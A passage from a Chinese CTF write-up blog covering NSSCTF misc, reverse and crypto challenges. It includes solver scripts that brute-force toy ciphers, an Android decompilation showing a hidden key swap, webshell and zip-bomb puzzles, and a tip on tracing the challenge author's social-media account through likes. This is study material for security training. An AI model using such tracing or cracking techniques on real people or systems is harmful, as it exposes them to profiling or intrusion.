<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2text</span>(<span class="params">im</span>):</span></span><br><span class="line"> width, height = im.size</span><br><span class="line"> lst = []</span><br><span class="line"> <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        blue = im.getpixel((x, y))[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> blue == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lst.append(<span class="built_in">chr</span>(blue))</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(lst)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span></span><br><span class="line">    all_text = img2text(Image.<span class="built_in">open</span>(<span class="string">&quot;flag.bmp&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>

<p>wp里的提取脚本，得到一串16进制且504B开头，放进010改成zip，里面有flag.txt</p>
<p>打开flag.txt，发现是两段类似文字，两段相减得到flag</p>
<hr>
<h2 id="BadUSB"><a href="#BadUSB" class="headerlink" title="BadUSB"></a>BadUSB</h2><p>根据题目名称可知是BadUSB，查找相关资料可知是通过USB-HID进行攻击，查找设备描述</p>
<p><img src="https://i.loli.net/2021/10/27/zk2pAKJumD6oCRV.png" alt="EU41H.png"></p>
<p>是键盘</p>
<p><img src="https://i.loli.net/2021/10/27/yjJ3F2cDNerITRz.png" alt="6BG.png"></p>
<p>然后通过键盘流量可以推断出flag</p>
<p>复现不动，还需要知道是怎么对应的才行</p>
<hr>
<ul>
<li><p>这misc题是真多，图也真的多，认真地整理起来也太花时间了</p>
</li>
<li><p>还是见的题少了</p>
</li>
<li><p>不过这比赛有这么多难度合适的原创题还是舒服的</p>
</li>
<li><p>新生赛道拿第三名也挺舒服的，就是没奖品</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTFReverse题解，但就挺加密解密的</title>
    <url>/2021/10/27/NSSCTFReverse%E9%A2%98%E8%A7%A3%EF%BC%8C%E4%BD%86%E5%B0%B1%E6%8C%BA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%9A%84/</url>
    <content><![CDATA[<p>首先，做了2道附件给程序的简单常见的re，然后剩下了一堆，python脚本，打开一看全是加密呢，并且刚好挑了一道需要爆破才能解的，逆了半天放弃了，难顶，然后我看wp的时候发现这种题爆破确实好用，有时候逆着算确实花时间</p>
<span id="more"></span> 

<hr>
<h2 id="简简单单的逻辑"><a href="#简简单单的逻辑" class="headerlink" title="简简单单的逻辑"></a>简简单单的逻辑</h2><p>爆破就行了，</p>
<pre><code>list = [47, 138, 127, 57, 117, 188, 51, 143, 17, 84, 42, 135, 76, 105, 28, 169, 25]
results=&#39;bcfba4d0038d48bd4b00f82796d393dfec&#39;
flag = &#39;&#39;
for i in range(len(list)):
    for j in range(32,128):
        key = (list[i]&gt;&gt;4)+((list[i] &amp; 0xf)&lt;&lt;4)
        result = str(hex(j^key))[2:].zfill(2)
        if(result == results[i*2:i*2+2]):
            flag += chr(j)
            break
print(flag)
</code></pre>
<p>或者逆向</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result=&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span><br><span class="line">list = [47, 138, 127, 57, 117, 188, 51, 143, 17, 84, 42, 135, 76, 105, 28, 169, 25]</span><br><span class="line">de = []</span><br><span class="line">for i in range(len(list)):</span><br><span class="line">    key = (list[i]&gt;&gt;4)+((list[i] &amp; 0xf)&lt;&lt;4)</span><br><span class="line">    de.append(key)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(result)//2):</span><br><span class="line">    n = int(result[i*2:(i+1)*2],16)</span><br><span class="line">    flag += chr(n^de[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="简简单单的解密"><a href="#简简单单的解密" class="headerlink" title="简简单单的解密"></a>简简单单的解密</h2><p>RC4，但可以爆破</p>
<pre><code>import base64,urllib.parse
key = &quot;HereIsFlagggg&quot;
flag = &#39;&#39;
enc = &quot;%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA&quot;
enc = urllib.parse.unquote(enc)
s_box = list(range(256))
j = 0
for i in range(256):
    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
    s_box[i], s_box[j] = s_box[j], s_box[i]
res = []
i = j = 0
for s in range(len(enc)):
    i = (i + 1) % 256
    j = (j + s_box[i]) % 256
    s_box[i], s_box[j] = s_box[j], s_box[i]
    t = (s_box[i] + s_box[j]) % 256
    k = s_box[t]
    for ff in range(32,128):
        if(chr(ff ^ k) == enc[s]):
            print(chr(ff),end=&#39;&#39;)
</code></pre>
<p>or re</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">key = &quot;HereIsFlagggg&quot;</span><br><span class="line">enc = &#x27;%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA&#x27;</span><br><span class="line">enc = urllib.parse.unquote(enc)</span><br><span class="line">s_box = list(range(256))</span><br><span class="line">j = 0</span><br><span class="line">for i in range(256):</span><br><span class="line">    j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">res = []</span><br><span class="line">i = j = 0</span><br><span class="line">for s in enc:</span><br><span class="line">    i = (i + 1) % 256</span><br><span class="line">    j = (j + s_box[i]) % 256</span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    t = (s_box[i] + s_box[j]) % 256</span><br><span class="line">    k = s_box[t]</span><br><span class="line">    res.append(chr(ord(s) ^ k))</span><br><span class="line">ret = &quot;&quot;.join(res)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="非常简单的逻辑题"><a href="#非常简单的逻辑题" class="headerlink" title="非常简单的逻辑题"></a>非常简单的逻辑题</h2><p>还是爆破，反正每个位不会影响到其他的位，爆，都可以爆</p>
<pre><code>s = &#39;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#39;
results = &#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#39;
flag = &#39;&#39;
for i in range(21):
    for j in range(32,128):
        s1 = j//17
        s2 = j%17
        result = s[(s1+i)%34]+s[-(s2+i+1)%34]
        if(results[i*2:i*2+2] == result):
            flag += chr(j)
            break
print(flag)
</code></pre>
<p>还是可以逆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span><br><span class="line">result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(len(result)//2):</span><br><span class="line">    p = result[i*2:(i+1)*2]</span><br><span class="line">    flag += chr((s.index(p[0])-i)*17+len(s)-s.index(p[1])-i-1)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="fakerandom"><a href="#fakerandom" class="headerlink" title="fakerandom"></a>fakerandom</h2><p>又双叒叕是爆破</p>
<pre><code>import random
flag = &#39;xxxxxxxxxxxxxxxxxxxx&#39;  #len=20
random.seed(1)
l = []
for i in range(4):
    l.append(random.getrandbits(8))
    print(l)
result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]
flag = &#39;&#39;
for i in range(len(l)):
    random.seed(l[i])
    for n in range(5):
        tmp = random.getrandbits(8)
        for j in range(32,128):
            tmps = j^tmp
            if(tmps == result[i*5+n]):
                flag += chr(j)
                break
print(flag)
</code></pre>
<p>反着算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span><br><span class="line">random.seed(1)</span><br><span class="line">l = []</span><br><span class="line">for i in range(4):</span><br><span class="line">    l.append(random.getrandbits(8))</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    for n in range(5):</span><br><span class="line">        flag += chr(result[i*5+n]^random.getrandbits(8))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="fakebase"><a href="#fakebase" class="headerlink" title="fakebase"></a>fakebase</h2><p>推一下就知道每次都要上一次得到的数*31 + 这次得到的数。<br>然后数的话从密文里得，找索引。<br>但是最后取余得到的数不知道是多少，没有输出，于是爆破（但我当时刚好第一道挑中它且一步步逆，浪费了不少时间）</p>
<pre><code>s_box = &#39;qwertyuiopasdfghjkzxcvb123456#$&#39;
import libnum
s = &quot;u#k4ggia61egegzjuqz12jhfspfkay&quot;
count = []
s = s[::-1]
for i in s:
    ind = s_box.find(i)
    count.append(ind)
print(count)
flag = 1
for j in range(31):
    for i in range(len(count)):
        if(i==0):
            flag = j*31 + count[i]
        else:
            flag = flag*31 + count[i]
    print(libnum.n2s(flag))
</code></pre>
<p>但是好像还是可以逆的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s_box = &#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span><br><span class="line">s = &#x27;u#k4ggia61egegzjuqz12jhfspfkay&#x27;</span><br><span class="line">s = s[::-1]</span><br><span class="line">ret = 3</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    m = s_box.index(s[i])</span><br><span class="line">    ret = ret*31+m</span><br><span class="line">ret = str(bin(ret))[2:]</span><br><span class="line">if len(ret)%8 != 0:</span><br><span class="line">    ret = ret.zfill(len(ret)+8-len(ret)%8)</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(ret)//8):</span><br><span class="line">    result += chr(int(ret[8*i:8*(i+1)],2))</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="re1-re2"><a href="#re1-re2" class="headerlink" title="re1 re2"></a>re1 re2</h2><p>都很常规，一个是换字符，一个是位移</p>
<hr>
<h1 id="easyapp"><a href="#easyapp" class="headerlink" title="easyapp"></a>easyapp</h1><p>安装应用查看可知是一个输入flag判断对错的简单app</p>
<p>随便选择一个反编译dex的工具 反编译dex 转java可知</p>
<p>有3个关键的类 使用工具转java代码可知</p>
<ul>
<li>Encoder</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Encoder &#123;</span><br><span class="line">    private int key = 0x075bcd15;</span><br><span class="line"></span><br><span class="line">    public Encoder() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String encode(String str) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        for (char c : str.toCharArray()) &#123;</span><br><span class="line">            sb.append((char) (c ^ this.key));</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析代码 可知这是一个异或函数 把字符串的每一位和 key 异或</p>
<ul>
<li>MainActivity</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void onCreate(Bundle bundle) &#123;</span><br><span class="line">        MainActivity.super.onCreate(bundle);</span><br><span class="line">        setContentView(0x7f0b001c);</span><br><span class="line">        encoder = new Encoder();</span><br><span class="line">        mainActlvity = new MainActlvity();</span><br><span class="line">        ((Button) findViewById(0x7f080057)).setOnClickListener(new -$.Lambda.MainActivity.i-SDaQT6aGr2btgF05Lf-fvXXSo(this, (EditText) findViewById(0x7f080090)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void lambda$onCreate$0$MainActivity(EditText editText, View view) &#123;</span><br><span class="line">        System.out.println(encoder.encode(editText.getText().toString()));</span><br><span class="line">        if (encoder.encode(editText.getText().toString()).equals(&quot;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&quot;)) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;YES&quot;, 0).show();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(this, &quot;NO&quot;, 0).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>分析代码 可知 用户输入经过 Encode 之后 和 一个静态字符串比较</p>
<p><strong>如果仔细分析一下代码 可知 在创建时 调用了MainActlvity</strong></p>
<ul>
<li>MainActlvity</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MainActlvity &#123;</span><br><span class="line">    public MainActlvity() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field declaredField = Encoder.class.getDeclaredField(&quot;key&quot;);</span><br><span class="line">            declaredField.setAccessible(true);</span><br><span class="line">            declaredField.set(MainActivity.encoder, 0x3ade68b1);</span><br><span class="line">        &#125; catch (IllegalAccessException | NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析代码可知 这里把 Encode key 的值掉包成了 <code>0x3ade68b1</code></strong></p>
<p>综合上述本题其实就是一个最简单的异或 <strong>把 key 掉包了</strong> 如果仔细分析了代码 或者使用动态调试 都能发现</p>
<p>最后异或一下得出flag <code>NSSCTF&#123;apkYYDS&#125;</code></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF有意思但是好像比较一次性的misc题解</title>
    <url>/2021/10/26/NSSCTF%E6%9C%89%E6%84%8F%E6%80%9D%E4%BD%86%E6%98%AF%E5%A5%BD%E5%83%8F%E6%AF%94%E8%BE%83%E4%B8%80%E6%AC%A1%E6%80%A7%E7%9A%84misc%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>就可能以后用不上但是还是想记一下</p>
  <span id="more"></span> 

<h2 id="我的银行卡密码"><a href="#我的银行卡密码" class="headerlink" title="我的银行卡密码"></a>我的银行卡密码</h2><p>首先，弱口令爆破6位数字银行卡密码，然后拿到文本（这里的T1234后面出题人说给错提示了，不过我第一步手机键盘解密就没想出来，记录只是因为古典密码套娃很有意思）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">93 53 63 71 51 63 41 51 83 63 23 23 93 62 61 94 93 71 41 92 41 71 63 41 51 31 83 43 41 21 81 22 21 74 42</span><br><span class="line"></span><br><span class="line">The encryption scheme of next stage is decided by the last  letters.</span><br><span class="line"></span><br><span class="line">T1:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@**</span><br><span class="line"></span><br><span class="line">T2:@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@@@@**</span><br><span class="line"></span><br><span class="line">T3:@@@@@@@@@@@@@@@@@   **@@@@@@@**</span><br><span class="line"></span><br><span class="line">T4:@@@@@@@@   **@@@@@@ @@@**</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;REVERSE(**@@@@@@@@**)&#125; </span><br></pre></td></tr></table></figure>

<p>第一层观察数字两个一组第一个数字没有1第二个数字只有1-4第一时间联想的就是手机键盘解密解出来</p>
<p><strong>YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH</strong></p>
<p>然后这个时候后面的ATBASH就是提示</p>
<p>Atbash加密，简单来说A对于Z B对于Y以此类推解密后</p>
<p><strong>BOLKQLTQELXXBMNABKTCTKLTQWERT</strong></p>
<p>可以发现末尾是QWERT，那就是对于QWERT键盘加密</p>
<p>QWERT加密，简单来讲按照键盘排布顺序，从左上到右下重新用ABCDE排序排一次</p>
<p><strong>XISRASEACSUUXZYKXREVERSE</strong></p>
<p>然后后面Reverse，其实前面可以看出来是SIx Caesar了不过还是根据题目走一下</p>
<p><strong>XKYZXUUSCAESARSIX</strong></p>
<p>是凯撒6，把偏移移正，或者滚一边凯撒都可以看出来一个单词</p>
<p><strong>RESTROOM</strong></p>
<p>最后按照题目原本的NSSCTF{REVERSE(<strong>@@@@@@@@</strong>)}</p>
<p>Reverse一次以及描述中的小写</p>
<p><strong>NSSCTF{moortser}</strong></p>
<hr>
<h2 id="here-is-a-bug"><a href="#here-is-a-bug" class="headerlink" title="here is a bug"></a>here is a bug</h2><p>既然提到的WebShell，那随便找个杀毒软件扫一下，基本就出结果了。</p>
<p>![here1](<a href="https://wdljt-img.oss-cn-shanghai.aliyuncs.com/NSSCTF/Image/here1.png">https://wdljt-img.oss-cn-shanghai.aliyuncs.com/NSSCTF/Image/here1.png</a></p>
<p>第31行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pass = &#x27;oh_you_catch_the_bug&#x27;; //angel</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Mooooooooooorse"><a href="#Mooooooooooorse" class="headerlink" title="Mooooooooooorse"></a>Mooooooooooorse</h2><p>经典音频摩斯电码</p>
<hr>
<h2 id="zipbomb"><a href="#zipbomb" class="headerlink" title="zipbomb"></a>zipbomb</h2><p>这题直接用手机开，压缩包自动修复了，zip炸弹已经这么拉了吗，所以这里直接搬出题人写的记录一下</p>
<h3 id="出题人思路"><a href="#出题人思路" class="headerlink" title="出题人思路"></a>出题人思路</h3><p>我其实是想让新生用Binwalk或者Ctrl+F生扒的结果好像这样做的人反而少。。。</p>
<p><img src="https://wdljt-img.oss-cn-shanghai.aliyuncs.com/NSSCTF/Image/ZipBomb1.png" alt="ZipBomb1"></p>
<p>手动dump或者删掉前面的都行，打开就是flag</p>
<p><strong>NSSCTF{Z1p_B00m_d1sp0sal}</strong></p>
<p>至于为什么要那么多的NSSCTF，是因为他的压缩率太低，Hex一看直接明文了，就索性让他强制压缩。</p>
<h3 id="大佬思路"><a href="#大佬思路" class="headerlink" title="大佬思路"></a>大佬思路</h3><p>这里参考参考<a href="https://wd-ljt.com/go/v1/https://blog.csdn.net/qq_42880719/article/details/120582014">套神</a>的脚本与博客</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os.path</span><br><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">dir_path=&#x27;C:\\Users\\mumuzi\\Desktop\\NSS附件包\\MISC&#x27;</span><br><span class="line">files= os.listdir(dir_path)</span><br><span class="line">newfiles = [&quot;zipbomb.zip&quot;]</span><br><span class="line">print(newfiles)</span><br><span class="line">setee = []</span><br><span class="line">for file in newfiles: #遍历文件夹</span><br><span class="line">    position = dir_path+&#x27;\\&#x27;+ file #构造绝对路径，&quot;\\&quot;，其中一个&#x27;\&#x27;为转义符</span><br><span class="line">    print (position)</span><br><span class="line">    z = zipfile.ZipFile(position, &#x27;r&#x27;)</span><br><span class="line">    for filename in z.namelist():</span><br><span class="line">        bytes = z.read(filename)</span><br><span class="line">        if b&#x27;NSSCTF&#123;&#x27; in bytes:</span><br><span class="line">            print(filename)</span><br></pre></td></tr></table></figure>

<p>直接搜flag毕竟都是NSSCTF开头的。这里有个小坑点（其实原本是想将0304改一下让他融入到压缩包里面，但是又觉得太过分，以及虽然融进去了会出点问题）他这个找到的文件里面并不在zipbomb里面而是在zipbomb后面的压缩包里面。</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>部分手机和压缩软件会直接省略压缩率过高的然后打开就是flag光速白给。</p>
<hr>
<h2 id="gif好像有点大"><a href="#gif好像有点大" class="headerlink" title="gif好像有点大"></a>gif好像有点大</h2><p>在gif里面找一帧二维码 然后扫它</p>
<hr>
<h2 id="二维码不止二维码"><a href="#二维码不止二维码" class="headerlink" title="二维码不止二维码"></a>二维码不止二维码</h2><p>二维码套娃</p>
<p>当时做到mircoQR卡住了，真没见过</p>
<p>用中国编码和<a href="https://demo.dynamsoft.com/barcode-reader/%E8%BD%AE%E7%9D%80%E8%AF%95%E5%B0%B1%E8%A1%8C">https://demo.dynamsoft.com/barcode-reader/轮着试就行</a></p>
<hr>
<h2 id="Minecraft的那些事"><a href="#Minecraft的那些事" class="headerlink" title="Minecraft的那些事"></a>Minecraft的那些事</h2><p>官方手法，进入Minecraft Wiki官网</p>
<p><a href="https://wd-ljt.com/go/v1/https://minecraft.fandom.com/zh/wiki/Minecraft_Wiki">https://minecraft.fandom.com/zh/wiki/Minecraft_Wiki</a></p>
<p>直接搜索二维码，你会看到15w14a的愚人节版本快照，进去一眼就可以看到flag</p>
<p><img src="https://wdljt-img.oss-cn-shanghai.aliyuncs.com/NSSCTF/Image/Minecraft.png" alt="Minecraft"></p>
<p>扫描后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Minecraft 1.9: The Combat Update</span><br></pre></td></tr></table></figure>

<p>md5后就是flag了NSSCTF{47b6c4d68f6cd92ee5f15b59c05b68f7}</p>
<hr>
<h2 id="Minecraft-Wiki的那些事"><a href="#Minecraft-Wiki的那些事" class="headerlink" title="Minecraft Wiki的那些事"></a>Minecraft Wiki的那些事</h2><p>概括一下，出题人当过mcwiki巡查，上任官博被他转过，flag大概在那</p>
<p>所以要找出题人的微博</p>
<p>然后题目放出的时候出题人的转发微博被夹了，一道白给的osint就突然扑朔迷离难度++++，但是就是能做</p>
<p>我是可以通过看那条微博的点赞用户找到人，也可以看新点赞的用户里新加的关注</p>
<p>但是好像也可以在确认目标后百度出题人的ID，然后找到博客，再找到微博链接</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTFCrypto部分题解</title>
    <url>/2021/10/26/NSSCTFCrypto%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>当时对rsa真不熟，装gmpy2库都装不明白，总不能口算rsa吧，不过现在装明白了但是还是不熟</p>
<span id="more"></span> 

<h2 id="Crypto6"><a href="#Crypto6" class="headerlink" title="Crypto6"></a>Crypto6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br></pre></td></tr></table></figure>

<p>代码逻辑：base64-&gt;base32-&gt;base16，反解即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(b64decode(b32decode(b16decode(<span class="built_in">str</span>.encode()))))</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Crypto7"><a href="#Crypto7" class="headerlink" title="Crypto7"></a>Crypto7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">69f7906323b4f7d1e4e972acf4abfbfc,得到的结果用NSSCTF&#123;&#125;包裹。</span><br></pre></td></tr></table></figure>

<p>字符串长度32位，很容易想到为MD5，也确实是md5</p>
<hr>
<h2 id="Crypto8"><a href="#Crypto8" class="headerlink" title="Crypto8"></a>Crypto8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</span><br></pre></td></tr></table></figure>

<p>这里用的是uucode，我用了ciphey才知道</p>
<p>也可以用php的convert_uudecode() 函数解密。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> convert_uudecode(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Crypto9"><a href="#Crypto9" class="headerlink" title="Crypto9"></a>Crypto9</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;</span><br><span class="line">脚本给你了，去解吧</span><br><span class="line"></span><br><span class="line">letter_list = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="comment"># 字母表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的key生成key列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_KeyList</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span></span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># 遍历明文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 明文是否为字母,如果是,则判断大小写,分别进行加密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到密文字符串里</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, key</span>):</span></span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># 遍历密文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 密文为否为字母,如果是,则判断大小写,分别进行解密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到明文字符串里</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密请按D,解密请按E:&quot;</span>)</span><br><span class="line">    user_input = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">while</span> (user_input != <span class="string">&#x27;D&#x27;</span> <span class="keyword">and</span> user_input != <span class="string">&#x27;E&#x27;</span>):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入有误!请重新输入:&quot;</span>)</span><br><span class="line">        user_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入密钥:&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">False</span> == key.isalpha()):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span 